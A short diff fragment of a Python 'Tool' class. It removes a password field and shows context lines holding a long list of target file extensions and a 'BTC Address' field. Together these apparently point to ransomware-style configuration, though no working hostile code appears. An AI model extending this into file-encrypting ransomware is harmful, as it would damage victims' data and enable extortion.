@@ -58,7 +58,6 @@ class Tool:
                         "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                         "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                         "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
-        self.password_field = "" # For the interface
         self.new_server_address = "BTC Address" # For updates
         self.loop = True
 
